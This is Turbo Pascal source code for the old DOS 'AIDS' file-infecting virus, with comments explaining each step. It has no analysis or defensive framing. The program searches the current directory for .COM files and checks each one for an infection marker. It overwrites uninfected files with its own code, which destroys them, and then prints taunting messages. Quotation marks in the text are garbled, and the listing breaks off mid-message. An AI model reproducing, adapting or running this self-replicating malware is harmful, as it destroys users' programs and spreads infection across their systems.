
{ Beginning of source code, Turbo Pascal 3.01a }
{C-}
{U-}
{I-}       { Wont allow a user break, enable IO check }

{ -- Constants --------------------------------------- }

Const
     VirusSize = 13847;    { AIDSYs code size }

     Warning   :String[42]     { Warning message }
     = ZThis File Has Been Infected By AIDS! HaHa!Y;

{ -- Type declarations------------------------------------- }

Type
     DTARec    =Record      { Data area for file search }
     DOSnext  :Array[1..21] of Byte;
                   Attr    : Byte;
                   Ftime,
                   FDate,
                   FLsize,
                   FHsize  : Integer;
                   FullName: Array[1..13] of Char;
                 End;

Registers    = Record    {Register set used for file search }
   Case Byte of
   1 : (AX,BX,CX,DX,BP,SI,DI,DS,ES,Flags : Integer);
   2 : (AL,AH,BL,BH,CL,CH,DL,DH          : Byte);
   End;

{ -- Variables--------------------------------------------- }

Var
                               { Memory offset program code }
   ProgramStart : Byte absolute Cseg:$100;
                                          { Infected marker }
   MarkInfected : String[42] absolute Cseg:$180;
   Reg          : Registers;                 { Register set }
   DTA          : DTARec;                       { Data area }
   Buffer       : Array[Byte] of Byte;        { Data buffer }
   TestID       : String[42]; { To recognize infected files }
   UsePath      : String[66];        { Path to search files }
                                    { Lenght of search path }
   UsePathLenght: Byte absolute UsePath;
   Go           : File;                    { File to infect }
   B            : Byte;                              { Used }
   LoopVar      : Integer;  {Will loop forever}

{ -- Program code------------------------------------------ }

Begin
  GetDir(0, UsePath);               { get current directory }
  if Pos(Z\Y, UsePath) <> UsePathLenght then
    UsePath := UsePath + Z\Y;
  UsePath := UsePath + Z*.COMY;        { Define search mask }
  Reg.AH := $1A;                            { Set data area }
  Reg.DS := Seg(DTA);
  Reg.DX := Ofs(DTA);
  MsDos(Reg);
  UsePath[Succ(UsePathLenght)]:=#0; { Path must end with #0 }
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg.CX := $ff;          { Set attribute to find ALL files }
  MsDos(Reg);                   { Find first matching entry }
  IF not Odd(Reg.Flags) Then         { If a file found then }
    Repeat
      UsePath := DTA.FullName;
      B := Pos(#0, UsePath);
      If B > 0 then
      Delete(UsePath, B, 255);             { Remove garbage }
      Assign(Go, UsePath);
      Reset(Go);
      If IOresult = 0 Then          { If not IO error then }
      Begin
        BlockRead(Go, Buffer, 2);
        Move(Buffer[$80], TestID, 43);
                      { Test if file already ill(Infected) }
        If TestID <> Warning Then        { If not then ... }
        Begin
          Seek (Go, 0);
                            { Mark file as infected and .. }
          MarkInfected := Warning;
                                               { Infect it }
          BlockWrite(Go,ProgramStart,Succ(VirusSize shr 7));
          Close(Go);
          Halt;                   {.. and halt the program }
        End;
        Close(Go);
      End;
        { The file has already been infected, search next. }
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
    {  ......................Until no more files are found }
    Until Odd(Reg.Flags);
Loopvar:=Random(10);
If Loopvar=7 then
begin
  Writeln(Z








Y);                          {Give a lot of smiles}
Writeln(ZY);
Writeln(Z     Y);
Writeln(Z                                 ATTENTION:
 Y);
Writeln(Z      I have been elected to inform you that throughout your process of
 Y);
Writeln(Z      collecting and executing files, you have accidentally H
